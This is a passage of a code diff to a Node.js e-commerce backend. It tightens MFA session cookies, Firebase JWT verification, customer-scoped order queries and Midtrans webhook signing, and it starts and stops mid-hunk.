+  const anchor = customerSecurityIssueSignedSessionAnchorV228(
+    req,
+    res,
+    user,
+    requestedMaxAgeSeconds,
+    securityEpoch
+  );
+  const sessionHash = anchor && anchor.binding ? String(anchor.binding) : '';
+  if (!sessionHash) {
+    return {
+      token: '',
+      expiresAtMs: 0,
+      activeAtMs: 0,
+      maxAgeSeconds: 0,
+      error: 'MFA_SIGNED_SESSION_ANCHOR_UNAVAILABLE'
+    };
+  }
   const payload = {
     type: CUSTOMER_MFA_SESSION_TYPE,
     method,
     emailHash: customerMfaProfileId(email),
     authUserIdHash: userId ? customerMfaBindingHash('auth_user_id', userId) : '',
-    customerIdHash: customerId ? customerMfaBindingHash('customer_id', customerId) : '',
+    customerIdHash: customerMfaBindingHash('customer_id', customerId),
+    sessionBindingVersion: 5,
     sessionHash,
+    securityEpoch,
     jti: crypto.randomBytes(24).toString('base64url'),
     activeAtMs: now,
-    expiresAtMs: now + maxAgeSeconds * 1000,
+    expiresAtMs: Number(anchor.expiresAtMs),
     originHash: customerMfaBindingHash('origin', requestOrigin(req)),
     uaHash: customerMfaBindingHash('ua', requestUserAgent(req)),
     recoveryVerified: method === 'recovery_code'
@@ -7333,16 +9588,28 @@ function customerSecurityCreateDashboardMfaToken(req, user, method = 'recovery_c
     token: payloadBase64 + '.' + signature,
     expiresAtMs: payload.expiresAtMs,
     activeAtMs: payload.activeAtMs,
-    maxAgeSeconds
+    maxAgeSeconds: Number(anchor.maxAgeSeconds)
   };
 }
 
 function customerSecuritySetDashboardMfaCookie(res, proof) {
   const token = proof && proof.token ? String(proof.token) : '';
   const maxAge = Math.max(1, Math.floor(Number(proof && proof.maxAgeSeconds || 0)));
-  if (!token || !maxAge) return;
-  appendSetCookie(res, [
-    makeCookie(CUSTOMER_MFA_COOKIE, token, { maxAge })
+  if (!token || !maxAge) return false;
+
+  const legacyDomainClears = getCompactCookieDomainsForSession()
+    .filter((domain) => Boolean(normalizeCookieDomain(domain)))
+    .map((domain) => makeCookie(CUSTOMER_MFA_COOKIE, '', {
+      maxAge: 0,
+      domain
+    }));
+  const canonicalMfaCookie = makeCookie(CUSTOMER_MFA_COOKIE, token, {
+    maxAge,
+    domain: ''
+  });
+  return replaceResponseCookieByNameV229(res, CUSTOMER_MFA_COOKIE, [
+    ...legacyDomainClears,
+    canonicalMfaCookie
   ]);
 }
 
@@ -7362,27 +9629,29 @@ async function customerSecurityVerifyRecoveryCode(req, res, action) {
     await customerSecurityRegisterFailedVerification(req, action, 'invalid_recovery_request_id', access.customerId);
     return res.status(400).json({ ok: false, message: 'Request recovery tidak valid.' });
   }
-  if (Array.from(code).length !== CUSTOMER_SECURITY_RECOVERY_CODE_LENGTH) {
+  if (Array.from(code).length !== LOST_PASSKEY_RECOVERY_CODE_LENGTH_V157) {
     await customerSecurityRegisterFailedVerification(req, action, 'invalid_recovery_code_length', access.customerId);
     return res.status(400).json({
       ok: false,
-      message: 'Recovery code tidak valid. Masukkan tepat 500 karakter dari file recovery terenkripsi.'
+      message: 'Recovery code tidak valid. Masukkan tepat ' + LOST_PASSKEY_RECOVERY_CODE_LENGTH_V157 + ' karakter dari file recovery terenkripsi.'
     });
   }
 
-  const owner = await customerSecurityResolveLostPasskeyOwner(access);
-  if (!owner.ok) {
-    return res.status(owner.status || 403).json({
-      ok: false,
-      message: owner.message || 'Recovery passkey tidak dapat diverifikasi.'
-    });
+  // SERVER 1 proxy-only boundary: no customer-table or passkey-table recovery lookup.
+  // Server 2 resolves and validates the official owner and active passkeys.
+  const owner = {
+    ok: true,
+    authUserId: String(access && access.authUserId || ''),
+    customerId: String(access && access.customerId || ''),
+    email: normalizeAuthEmail(access && access.user && access.user.email)
+  };
+  if (!customerSecurityLooksLikeUuid(owner.authUserId)
+      || !customerSecurityLooksLikeUuid(owner.customerId)
+      || !isValidAuthEmail(owner.email)) {
+    return res.status(401).json({ ok: false, message: 'Sesi recovery tidak valid.' });
   }
 
-  const activePasskeys = await customerSecurityLostPasskeyActivePasskeys(owner);
-  if (!activePasskeys.length) {
-    return res.status(409).json({ ok: false, code: 'ACTIVE_PASSKEY_NOT_FOUND', message: 'Passkey aktif untuk akun ini belum ditemukan. Gunakan flow pembuatan Passkey normal.' });
-  }
-
+  const activePasskeys = [];
   const bindings = customerSecurityLostPasskeyBindings(req, owner);
 
   return customerSecurityVerifyRecoveryCodeViaWorker(
@@ -7413,7 +9682,7 @@ async function customerSecurityVerifyRecoveryCode(req, res, action) {
    - Tidak menyentuh login/hash/A2F/recovery lama.
    ============================================================ */
 
-const __diracAdminSecuritySupabasePreviousHandler = module.exports;
+const __diracAdminSecuritySupabasePreviousHandler = __diracV202DispatcherSentinel;
 
 const ADMIN_SECURITY_ACTIONS_SUPABASE = new Set([
   'admin_security_overview',
@@ -7433,12 +9702,12 @@ const ADMIN_SECURITY_ACTION_ALIASES_SUPABASE = Object.freeze({
   'admin_security_unblock_user': 'admin_security_unblock_user'
 });
 
-module.exports = async function adminSecurityCenterSupabaseWrapper(req, res) {
+__diracV202RegisterMiddleware(async function adminSecurityCenterSupabaseWrapper(req, res, nextHandlerV202) {
   const rawAction = String((req.query && req.query.action) || '').trim();
   const action = ADMIN_SECURITY_ACTION_ALIASES_SUPABASE[rawAction] || rawAction;
 
   if (!ADMIN_SECURITY_ACTIONS_SUPABASE.has(action)) {
-    return __diracAdminSecuritySupabasePreviousHandler(req, res);
+    return nextHandlerV202(req, res);
   }
 
   const cors = setCors(req, res, { isDomainAction: true });
@@ -7454,7 +9723,7 @@ module.exports = async function adminSecurityCenterSupabaseWrapper(req, res) {
       message: 'Admin Security Center belum dapat diproses.'
     });
   }
-};
+}, "adminSecurityCenterSupabaseWrapper");
 
 async function adminSecurityHandleActionSupabase(action, req, res) {
   if (action === 'admin_security_overview') {
@@ -7583,6 +9852,27 @@ function adminSecurityTokenLooksSupabase(token) {
   return iss.includes('supabase') || aud === 'authenticated' || aud === 'anon';
 }
 
+function adminSecurityVerifiedEmailV210(user, provider) {
+  if (!user || typeof user !== 'object' || Array.isArray(user)) return '';
+  const email = normalizeAuthEmail(user.email || user.email_address || '');
+  if (!email || (typeof isValidAuthEmail === 'function' && !isValidAuthEmail(email))) return '';
+  if (provider === 'firebase') return user.email_verified === true ? email : '';
+
+  const metadata = user.user_metadata && typeof user.user_metadata === 'object' ? user.user_metadata : {};
+  const identities = Array.isArray(user.identities) ? user.identities : [];
+  const identityVerified = identities.some((identity) => {
+    const data = identity && identity.identity_data && typeof identity.identity_data === 'object'
+      ? identity.identity_data
+      : {};
+    return data.email_verified === true || Boolean(data.email_confirmed_at || data.confirmed_at);
+  });
+  const verified = user.email_verified === true
+    || metadata.email_verified === true
+    || Boolean(user.email_confirmed_at || user.confirmed_at)
+    || identityVerified;
+  return verified ? email : '';
+}
+
 
 async function adminSecurityRequireSupabaseUser(req) {
   const token = adminSecurityGetSupabaseAccessToken(req);
@@ -7595,10 +9885,12 @@ async function adminSecurityRequireSupabaseUser(req) {
     const active = await adminSecurityVerifyFirebaseIdTokenNoEnv(tokenForFirebase);
     if (active && active.ok && active.payload) {
       const payload = active.payload;
+      const verifiedEmail = adminSecurityVerifiedEmailV210(payload, 'firebase');
+      if (!verifiedEmail) return null;
       return {
         id: String(payload.user_id || payload.sub || ''),
         user_id: String(payload.user_id || payload.sub || ''),
-        email: normalizeAuthEmail(payload.email || ''),
+        email: verifiedEmail,
         provider: 'firebase',
         raw: payload
       };
@@ -7613,10 +9905,12 @@ async function adminSecurityRequireSupabaseUser(req) {
     }).catch(() => null);
 
     if (result && result.ok && result.data && (result.data.id || result.data.email)) {
+      const verifiedEmail = adminSecurityVerifiedEmailV210(result.data, 'supabase');
+      if (!verifiedEmail) return null;
       return {
         id: result.data.id || result.data.user_id || '',
         user_id: result.data.id || result.data.user_id || '',
-        email: result.data.email || '',
+        email: verifiedEmail,
         provider: 'supabase',
         raw: result.data
       };
@@ -7631,7 +9925,8 @@ async function adminSecurityRequireSupabaseUser(req) {
         getHeader: () => null
       };
       const user = await requireDomainUser(req, fakeRes);
-      if (user) return user;
+      const verifiedEmail = adminSecurityVerifiedEmailV210(user, 'supabase');
+      if (user && verifiedEmail) return { ...user, email: verifiedEmail };
     } catch (_) {}
   }
 
@@ -7677,24 +9972,60 @@ function adminSecurityFirebaseProjectIdNoEnv() {
   return 'dirac-group';
 }
 
+function adminSecurityDecodeBase64UrlCanonicalV210(value, maximumBytes) {
+  const raw = String(value || '');
+  if (!raw || !/^[A-Za-z0-9_-]+$/.test(raw)) throw new Error('ADMIN_FIREBASE_JWT_ENCODING_INVALID');
+  const decoded = Buffer.from(raw, 'base64url');
+  if (!decoded.length
+      || decoded.length > Math.max(1, Number(maximumBytes || 0))
+      || decoded.toString('base64url') !== raw) {
+    decoded.fill(0);
+    throw new Error('ADMIN_FIREBASE_JWT_ENCODING_INVALID');
+  }
+  return decoded;
+}
+
 async function adminSecurityVerifyFirebaseIdTokenNoEnv(token) {
   try {
     const parts = String(token || '').split('.');
     if (parts.length !== 3) return { ok: false, reason: 'bad_jwt' };
 
-    const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8'));
-    const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
+    const headerBytes = adminSecurityDecodeBase64UrlCanonicalV210(parts[0], 4096);
+    const payloadBytes = adminSecurityDecodeBase64UrlCanonicalV210(parts[1], 16 * 1024);
+    let header;
+    let payload;
+    try {
+      header = JSON.parse(headerBytes.toString('utf8'));
+      payload = JSON.parse(payloadBytes.toString('utf8'));
+    } finally {
+      headerBytes.fill(0);
+      payloadBytes.fill(0);
+    }
 
-    if (header.alg !== 'RS256' || !header.kid) return { ok: false, reason: 'bad_header' };
+    if (!header || typeof header !== 'object' || Array.isArray(header)
+        || !payload || typeof payload !== 'object' || Array.isArray(payload)
+        || header.alg !== 'RS256'
+        || (header.typ !== undefined && header.typ !== 'JWT')
+        || !/^[A-Za-z0-9._-]{1,200}$/.test(String(header.kid || ''))) {
+      return { ok: false, reason: 'bad_header' };
+    }
 
     const projectId = adminSecurityFirebaseProjectIdNoEnv();
     const now = Math.floor(Date.now() / 1000);
+    const subject = String(payload.sub || payload.user_id || '');
+    const issuedAt = Number(payload.iat || 0);
+    const expiresAt = Number(payload.exp || 0);
 
     if (payload.aud !== projectId) return { ok: false, reason: 'bad_audience' };
     if (payload.iss !== 'https://securetoken.google.com/' + projectId) return { ok: false, reason: 'bad_issuer' };
-    if (!payload.sub && !payload.user_id) return { ok: false, reason: 'missing_sub' };
-    if (Number(payload.exp || 0) <= now) return { ok: false, reason: 'expired' };
-    if (Number(payload.iat || 0) > now + 300) return { ok: false, reason: 'bad_iat' };
+    if (!subject || subject.length > 128) return { ok: false, reason: 'missing_sub' };
+    if (!Number.isSafeInteger(expiresAt) || expiresAt <= now || expiresAt <= issuedAt) return { ok: false, reason: 'expired' };
+    if (!Number.isSafeInteger(issuedAt) || issuedAt > now + 300) return { ok: false, reason: 'bad_iat' };
+    if (payload.auth_time !== undefined
+        && (!Number.isSafeInteger(Number(payload.auth_time)) || Number(payload.auth_time) > now + 300)) {
+      return { ok: false, reason: 'bad_auth_time' };
+    }
+    if (!adminSecurityVerifiedEmailV210(payload, 'firebase')) return { ok: false, reason: 'email_not_verified' };
 
     const certs = await adminSecurityFirebaseCertsNoEnv();
     const cert = certs && certs[header.kid];
@@ -7704,7 +10035,10 @@ async function adminSecurityVerifyFirebaseIdTokenNoEnv(token) {
     verifier.update(parts[0] + '.' + parts[1]);
     verifier.end();
 
-    const ok = verifier.verify(cert, Buffer.from(parts[2], 'base64url'));
+    const signature = adminSecurityDecodeBase64UrlCanonicalV210(parts[2], 2048);
+    let ok = false;
+    try { ok = verifier.verify(cert, signature); }
+    finally { signature.fill(0); }
     if (!ok) return { ok: false, reason: 'bad_signature' };
 
     return { ok: true, payload };
@@ -7728,7 +10062,11 @@ async function adminSecurityFirebaseCertsNoEnv() {
 
   if (!response.ok) throw new Error('Gagal mengambil public certs login admin.');
 
-  const certs = await response.json();
+  const certText = await diracReadResponseTextLimitedV210(response, 512 * 1024);
+  const certs = certText ? JSON.parse(certText) : null;
+  if (!certs || typeof certs !== 'object' || Array.isArray(certs)) {
+    throw new Error('ADMIN_FIREBASE_CERT_RESPONSE_INVALID');
+  }
   const cacheControl = String(response.headers.get('cache-control') || '');
   const match = cacheControl.match(/max-age=(\d+)/i);
   const maxAge = match ? Math.max(60, Number(match[1]) || 3600) : 3600;
@@ -7996,7 +10334,7 @@ function adminSecuritySanitizeAdminSupabase(admin) {
 }
 
 function adminSecuritySafeErrorSupabase(error) {
-  return String(error && error.message ? error.message : error).slice(0, 180);
+  return diracSecurityRedactDiagnosticV210(error, 180);
 }
 
 /* ============================================================
@@ -8020,14 +10358,14 @@ function adminSecuritySafeErrorSupabase(error) {
    POST /api/health?action=pengembangan_checkout
    ============================================================ */
 
-const __diracSessionOwnershipCheckoutPreviousHandler = module.exports;
+const __diracSessionOwnershipCheckoutPreviousHandler = __diracV202DispatcherSentinel;
 
-module.exports = async function sessionOwnershipCheckoutWrapper(req, res) {
+__diracV202RegisterMiddleware(async function sessionOwnershipCheckoutWrapper(req, res, nextHandlerV202) {
   const rawAction = String((req.query && req.query.action) || '').trim();
   const action = sessionOwnershipCheckoutNormalizeAction(rawAction);
 
   if (!sessionOwnershipCheckoutIsAction(action)) {
-    return __diracSessionOwnershipCheckoutPreviousHandler(req, res);
+    return nextHandlerV202(req, res);
   }
 
   const cors = setCors(req, res, { isDomainAction: true });
@@ -8054,7 +10392,7 @@ module.exports = async function sessionOwnershipCheckoutWrapper(req, res) {
       message: 'Checkout belum dapat diproses dengan aman.'
     });
   }
-};
+}, "sessionOwnershipCheckoutWrapper");
 
 function sessionOwnershipCheckoutNormalizeAction(action) {
   const clean = String(action || '').trim().toLowerCase();
@@ -9106,7 +11444,7 @@ function sessionOwnershipCheckoutSafeUpstreamError(data) {
 }
 
 function sessionOwnershipCheckoutSafeError(error) {
-  return String(error && error.message ? error.message : error).slice(0, 180);
+  return diracSecurityRedactDiagnosticV210(error, 180);
 }
 
 /* ============================================================
@@ -9122,14 +11460,14 @@ function sessionOwnershipCheckoutSafeError(error) {
    GET /api/health?action=customer_orders
    ============================================================ */
 
-const __diracMyOrdersPreviousHandler = module.exports;
+const __diracMyOrdersPreviousHandler = __diracV202DispatcherSentinel;
 
-module.exports = async function myOrdersWrapper(req, res) {
+__diracV202RegisterMiddleware(async function myOrdersWrapper(req, res, nextHandlerV202) {
   const rawAction = String((req.query && req.query.action) || '').trim();
   const action = myOrdersNormalizeAction(rawAction);
 
   if (!myOrdersIsAction(action)) {
-    return __diracMyOrdersPreviousHandler(req, res);
+    return nextHandlerV202(req, res);
   }
 
   const cors = setCors(req, res, { isDomainAction: true });
@@ -9149,7 +11487,7 @@ module.exports = async function myOrdersWrapper(req, res) {
       message: 'Pesanan belum dapat dimuat dengan aman.'
     });
   }
-};
+}, "myOrdersWrapper");
 
 function myOrdersNormalizeAction(action) {
   const clean = String(action || '').trim().toLowerCase().replace(/[\s-]+/g, '_');
@@ -9281,7 +11619,10 @@ async function myOrdersFetchGenericOrders(owner, userEmail) {
   }
 
   const orderRows = Array.from(orderMap.values());
-  const itemMap = await myOrdersFetchOrderItems(orderRows.map((row) => row.id));
+  const itemMap = await myOrdersFetchOrderItems(
+    orderRows.map((row) => row.id),
+    owner && Array.isArray(owner.customerIds) ? owner.customerIds : []
+  );
 
   return {
     ok: errors.length === 0 || orderRows.length > 0,
@@ -9290,12 +11631,16 @@ async function myOrdersFetchGenericOrders(owner, userEmail) {
   };
 }
 
-async function myOrdersFetchOrderItems(orderIds) {
+async function myOrdersFetchOrderItems(orderIds, customerIds) {
   const ids = Array.from(new Set((orderIds || []).filter(customerSecurityLooksLikeUuid))).slice(0, 120);
+  const owners = Array.from(new Set((customerIds || []).filter(customerSecurityLooksLikeUuid))).slice(0, 20);
   const map = {};
-  if (!ids.length) return map;
-  const select = 'id,order_id,product_title,quantity,created_at';
-  const path = '/rest/v1/order_items?select=' + encodeURIComponent(select) + '&order_id=in.(' + ids.map(encodeURIComponent).join(',') + ')&order=created_at.asc';
+  if (!ids.length || !owners.length) return map;
+  const select = 'id,order_id,customer_id,product_title,quantity,created_at';
+  const path = '/rest/v1/order_items?select=' + encodeURIComponent(select)
+    + '&order_id=in.(' + ids.map(encodeURIComponent).join(',') + ')'
+    + '&customer_id=in.(' + owners.map(encodeURIComponent).join(',') + ')'
+    + '&order=created_at.asc';
   const result = await supabaseFetch(path, { method: 'GET', auth: 'service' }).catch(() => null);
   if (!result || !result.ok || !Array.isArray(result.data)) return map;
   result.data.forEach((item) => {
@@ -9366,7 +11711,10 @@ async function myOrdersFetchDomainOrders(owner, userEmail) {
   }
 
   const rows = Array.from(rowsMap.values());
-  const itemMap = await myOrdersFetchDomainOrderItems(rows.map((row) => row.id));
+  const itemMap = await myOrdersFetchDomainOrderItems(
+    rows.map((row) => row.id),
+    owner && Array.isArray(owner.customerIds) ? owner.customerIds : []
+  );
   return {
     ok: errors.length === 0 || rows.length > 0,
     error: errors[0] || '',
@@ -9374,12 +11722,15 @@ async function myOrdersFetchDomainOrders(owner, userEmail) {
   };
 }
 
-async function myOrdersFetchDomainOrderItems(orderIds) {
+async function myOrdersFetchDomainOrderItems(orderIds, customerIds) {
   const ids = Array.from(new Set((orderIds || []).filter(customerSecurityLooksLikeUuid))).slice(0, 120);
+  const owners = Array.from(new Set((customerIds || []).filter(customerSecurityLooksLikeUuid))).slice(0, 20);
   const map = {};
-  if (!ids.length) return map;
-  const select = 'id,order_id,domain_name,extension,years,register_price,renewal_price,subtotal';
-  const path = '/rest/v1/domain_order_items?select=' + encodeURIComponent(select) + '&order_id=in.(' + ids.map(encodeURIComponent).join(',') + ')';
+  if (!ids.length || !owners.length) return map;
+  const select = 'id,order_id,customer_id,domain_name,extension,years,register_price,renewal_price,subtotal';
+  const path = '/rest/v1/domain_order_items?select=' + encodeURIComponent(select)
+    + '&order_id=in.(' + ids.map(encodeURIComponent).join(',') + ')'
+    + '&customer_id=in.(' + owners.map(encodeURIComponent).join(',') + ')';
   const result = await supabaseFetch(path, { method: 'GET', auth: 'service' }).catch(() => null);
   if (!result || !result.ok || !Array.isArray(result.data)) return map;
   result.data.forEach((item) => {
@@ -9477,7 +11828,7 @@ function myOrdersSafeUpstreamError(data) {
 }
 
 function myOrdersSafeError(error) {
-  return String(error && error.message ? error.message : error).slice(0, 180);
+  return diracSecurityRedactDiagnosticV210(error, 180);
 }
 
 /* ============================================================
@@ -9495,14 +11846,14 @@ function myOrdersSafeError(error) {
    POST /api/health?action=pay_order
    ============================================================ */
 
-const __diracLockedCreatePaymentPreviousHandler = module.exports;
+const __diracLockedCreatePaymentPreviousHandler = __diracV202DispatcherSentinel;
 
-module.exports = async function lockedCreatePaymentWrapper(req, res) {
+__diracV202RegisterMiddleware(async function lockedCreatePaymentWrapper(req, res, nextHandlerV202) {
   const rawAction = String((req.query && req.query.action) || '').trim();
   const action = lockedPaymentNormalizeAction(rawAction);
 
   if (!lockedPaymentIsAction(action)) {
-    return __diracLockedCreatePaymentPreviousHandler(req, res);
+    return nextHandlerV202(req, res);
   }
 
   const cors = setCors(req, res, { isDomainAction: true });
@@ -9523,7 +11874,7 @@ module.exports = async function lockedCreatePaymentWrapper(req, res) {
       error: lockedPaymentPublicError(error)
     });
   }
-};
+}, "lockedCreatePaymentWrapper");
 
 function lockedPaymentNormalizeAction(action) {
   const clean = String(action || '').trim().toLowerCase();
@@ -9632,7 +11983,7 @@ async function lockedPaymentCreateForOrder(req, res) {
     });
   }
 
-  const itemCheck = await lockedPaymentValidateOrderItems(orderId, amount, serviceType);
+  const itemCheck = await lockedPaymentValidateOrderItems(orderId, customerId, amount, serviceType);
   if (!itemCheck.ok) {
     return res.status(itemCheck.status || 409).json({ ok: false, message: itemCheck.message });
   }
@@ -9708,6 +12059,7 @@ async function lockedPaymentCreateForOrder(req, res) {
     gatewayName,
     gatewayReference,
     transactionId: transaction.id,
+    customerId,
     orderId,
     orderCode,
     amount,
@@ -9786,12 +12138,14 @@ async function lockedPaymentFetchOwnedOrder(inputOrderId, customerId) {
   return { ok: true, order: row };
 }
 
-async function lockedPaymentValidateOrderItems(orderId, orderTotal, serviceType) {
+async function lockedPaymentValidateOrderItems(orderId, customerId, orderTotal, serviceType) {
   const amount = lockedPaymentMoney(orderTotal);
   const fallback = (reason) => lockedPaymentBuildFallbackOrderItem(amount, serviceType, reason);
 
-  const select = 'id,order_id,product_doc_id,product_title,quantity,unit_price,cost_price';
-  const path = '/rest/v1/order_items?select=' + encodeURIComponent(select) + '&order_id=eq.' + encodeURIComponent(orderId);
+  const select = 'id,order_id,customer_id,product_doc_id,product_title,quantity,unit_price,cost_price';
+  const path = '/rest/v1/order_items?select=' + encodeURIComponent(select)
+    + '&order_id=eq.' + encodeURIComponent(orderId)
+    + '&customer_id=eq.' + encodeURIComponent(customerId);
   const result = await supabaseFetch(path, { method: 'GET', auth: 'service' }).catch((error) => ({
     ok: false,
     status: 500,
@@ -10096,7 +12450,7 @@ function lockedPaymentSafeUpstreamError(data) {
 }
 
 function lockedPaymentSafeError(error) {
-  return String(error && error.message ? error.message : error).slice(0, 180);
+  return diracSecurityRedactDiagnosticV210(error, 180);
 }
 
 function lockedPaymentPublicError(error) {
@@ -10115,14 +12469,14 @@ function lockedPaymentPublicError(error) {
      customer/order cocok, dan event idempotent.
    ============================================================ */
 
-const __diracMidtransPaymentPreviousHandler = module.exports;
+const __diracMidtransPaymentPreviousHandler = __diracV202DispatcherSentinel;
 
-module.exports = async function midtransPaymentWrapper(req, res) {
+__diracV202RegisterMiddleware(async function midtransPaymentWrapper(req, res, nextHandlerV202) {
   const rawAction = String((req.query && req.query.action) || '').trim();
   const action = midtransNormalizeAction(rawAction);
 
   if (!midtransIsWebhookAction(action) && action !== 'midtrans_health') {
-    return __diracMidtransPaymentPreviousHandler(req, res);
+    return nextHandlerV202(req, res);
   }
 
   const cors = setCors(req, res, { isDomainAction: true });
@@ -10169,7 +12523,7 @@ module.exports = async function midtransPaymentWrapper(req, res) {
       error: lockedPaymentPublicError(error)
     });
   }
-};
+}, "midtransPaymentWrapper");
 
 function midtransNormalizeAction(action) {
   const clean = String(action || '').trim().toLowerCase();
@@ -10378,16 +12732,128 @@ function midtransAdjustItemDetailsToAmount(items, amount) {
   return details;
 }
 
+function midtransWebhookBindingSecret() {
+  const secret = String(process.env.DIRAC_MIDTRANS_BINDING_SECRET || '').trim();
+  const size = Buffer.byteLength(secret, 'utf8');
+  return size >= 64 && size <= 4096 ? secret : '';
+}
+
+function midtransWebhookBindingCanonical(input) {
+  const transactionId = String(input && input.transactionId || '').trim().toLowerCase();
+  const customerId = String(input && input.customerId || '').trim().toLowerCase();
+  const gatewayReference = String(input && input.gatewayReference || '').trim();
+  const parentType = String(input && input.parentType || '').trim().toLowerCase();
+  const parentId = String(input && input.parentId || '').trim().toLowerCase();
+  const serviceType = lockedPaymentNormalizeServiceType(input && input.serviceType || '');
+  const amount = midtransMoney(input && input.amount);
+  const currency = midtransSafeText(input && input.currency || 'IDR', 12).toUpperCase();
+
+  return [
+    'dirac-midtrans-webhook-binding-v2',
+    transactionId,
+    customerId,
+    gatewayReference,
+    parentType,
+    parentId,
+    serviceType,
+    String(amount),
+    currency
+  ].join('|');
+}
+
+function midtransWebhookBindingSignature(input) {
+  const secret = midtransWebhookBindingSecret();
+  if (!secret) return '';
+  return crypto
+    .createHmac('sha512', secret)
+    .update(midtransWebhookBindingCanonical(input), 'utf8')
+    .digest('base64url');
+}
+
+function midtransWebhookBindingBuildToken(input) {
+  const parentType = String(input && input.parentType || '').trim().toLowerCase();
+  const parentId = String(input && input.parentId || '').trim().toLowerCase();
+  const serviceType = lockedPaymentNormalizeServiceType(input && input.serviceType || '');
+  const signature = midtransWebhookBindingSignature(input);
+  if (!/^[rd]$/.test(parentType)
+      || !customerSecurityLooksLikeUuid(parentId)
+      || !/^[a-z0-9_]{1,64}$/.test(serviceType)
+      || !/^[A-Za-z0-9_-]{86}$/.test(signature)) return '';
+  const token = ['v2', parentType, parentId, serviceType, signature].join('.');
+  return Buffer.byteLength(token, 'utf8') <= 255 ? token : '';
+}
+
+function midtransWebhookBindingParseToken(value) {
+  const token = String(value || '').trim();
+  if (!token || Buffer.byteLength(token, 'utf8') > 255) return null;
+  const parts = token.split('.');
+  if (parts.length !== 5 || parts[0] !== 'v2') return null;
+  const parentType = String(parts[1] || '').trim().toLowerCase();
+  const parentId = String(parts[2] || '').trim().toLowerCase();
+  const serviceType = lockedPaymentNormalizeServiceType(parts[3] || '');
+  const signature = String(parts[4] || '').trim();
+  if (!/^[rd]$/.test(parentType)
+      || !customerSecurityLooksLikeUuid(parentId)
+      || !/^[a-z0-9_]{1,64}$/.test(serviceType)
+      || !/^[A-Za-z0-9_-]{86}$/.test(signature)) return null;
+  return { parentType, parentId, serviceType, signature };
+}
+
+function midtransWebhookBindingIsValid(input, suppliedSignature) {
+  const candidate = String(suppliedSignature || '').trim();
+  if (!/^[A-Za-z0-9_-]{86}$/.test(candidate)) return false;
+  const expected = midtransWebhookBindingSignature(input);
+  return Boolean(expected && safeEqual(candidate, expected));
+}
+
 async function midtransCreateSnapPayment(input) {
   const amount = midtransMoney(input.amount);
+  const transactionId = String(input && input.transactionId || '').trim();
+  const customerId = String(input && input.customerId || '').trim();
+  const gatewayReference = midtransSafeText(input && input.gatewayReference || '', 120);
+  const orderId = String(input && input.orderId || '').trim();
+  const domainOrderId = String(input && input.domainOrderId || '').trim();
+  const parentType = domainOrderId ? 'd' : 'r';
+  const parentId = domainOrderId || orderId;
+  const serviceType = lockedPaymentNormalizeServiceType(input && input.serviceType || '');
+  const currency = midtransSafeText(input && input.currency || 'IDR', 12).toUpperCase();
+
   if (amount <= 0) {
     return { ok: false, status: 409, message: 'Nominal Midtrans tidak valid.', error: 'invalid_amount' };
+  }
+  if (!customerSecurityLooksLikeUuid(transactionId)
+      || !customerSecurityLooksLikeUuid(customerId)
+      || !customerSecurityLooksLikeUuid(parentId)
+      || (orderId && domainOrderId && orderId !== domainOrderId)
+      || !gatewayReference
+      || !gatewayReference.startsWith('PAY-')
+      || !/^[A-Za-z0-9._:@-]{3,120}$/.test(gatewayReference)
+      || !/^[a-z0-9_]{1,64}$/.test(serviceType)
+      || currency !== 'IDR') {
+    return { ok: false, status: 409, message: 'Binding transaksi Midtrans tidak valid.', error: 'invalid_midtrans_binding' };
+  }
+  if (!midtransWebhookBindingSecret()) {
+    return { ok: false, status: 503, message: 'Secret binding Midtrans belum disetel.', error: 'midtrans_binding_secret_missing' };
+  }
+
+  const bindingToken = midtransWebhookBindingBuildToken({
+    transactionId,
+    customerId,
+    gatewayReference,
+    parentType,
+    parentId,
+    serviceType,
+    amount,
+    currency
+  });
+  if (!bindingToken) {
+    return { ok: false, status: 503, message: 'Binding Midtrans tidak dapat dibuat.', error: 'midtrans_binding_unavailable' };
   }
 
   const returnUrl = String(process.env.PAYMENT_RETURN_URL || process.env.DOMAIN_PAYMENT_RETURN_URL || process.env.DOMAIN_SITE_URL || 'https://diracgroup.store/pesanan.html').trim();
   const payload = {
     transaction_details: {
-      order_id: String(input.gatewayReference || '').trim(),
+      order_id: gatewayReference,
       gross_amount: amount
     },
     customer_details: {
@@ -10399,9 +12865,9 @@ async function midtransCreateSnapPayment(input) {
     callbacks: {
       finish: returnUrl
     },
-    custom_field1: String(input.transactionId || '').slice(0, 255),
-    custom_field2: String(input.orderId || input.domainOrderId || '').slice(0, 255),
-    custom_field3: String(input.serviceType || '').slice(0, 255)
+    custom_field1: transactionId,
+    custom_field2: customerId,
+    custom_field3: bindingToken
   };
 
   const enabledPayments = String(process.env.MIDTRANS_ENABLED_PAYMENTS || '').split(',').map((item) => item.trim()).filter(Boolean);
@@ -10538,6 +13004,7 @@ async function midtransCreateDomainPaymentInvoice(order, orderItems, customer) {
   const gateway = await midtransCreateSnapPayment({
     gatewayReference,
     transactionId: transaction.id,
+    customerId,
     domainOrderId,
     orderId: domainOrderId,
     orderCode,
@@ -10594,8 +13061,8 @@ async function midtransHandleWebhook(req, res) {
     return res.status(503).json({ ok: false, message: 'MIDTRANS_SERVER_KEY belum disetel.' });
   }
 
-  const body = await readBody(req);
-  if (!body || typeof body !== 'object') {
+  const body = req && req.__diracCentralParsedBodyV146;
+  if (!body || typeof body !== 'object' || Array.isArray(body)) {
     return res.status(400).json({ ok: false, message: 'Payload Midtrans tidak valid.' });
   }
 
@@ -10606,27 +13073,58 @@ async function midtransHandleWebhook(req, res) {
   const gatewayReference = midtransSafeText(body.order_id || '', 120);
   const gatewayEventId = midtransGatewayEventId(body);
   const grossAmount = midtransMoney(body.gross_amount);
+  const currency = midtransSafeText(body.currency || 'IDR', 12).toUpperCase();
+  const bindingTransactionId = midtransSafeText(body.custom_field1 || '', 80);
+  const bindingCustomerId = midtransSafeText(body.custom_field2 || '', 80);
+  const binding = midtransWebhookBindingParseToken(body.custom_field3 || '');
   const mappedStatus = midtransMappedPaymentStatus(body);
   const success = midtransSuccessStatus(body);
 
   if (!gatewayReference || !gatewayEventId || grossAmount <= 0) {
     return res.status(400).json({ ok: false, message: 'Payload Midtrans kurang lengkap.' });
   }
+  if (!customerSecurityLooksLikeUuid(bindingTransactionId)
+      || !customerSecurityLooksLikeUuid(bindingCustomerId)
+      || !binding) {
+    return res.status(403).json({ ok: false, message: 'Binding webhook Midtrans tidak valid.' });
+  }
 
-  const existingEvent = await midtransFetchGatewayEvent(gatewayEventId);
-  const duplicateEvent = Boolean(existingEvent.ok && existingEvent.exists);
+  const bindingValid = midtransWebhookBindingIsValid({
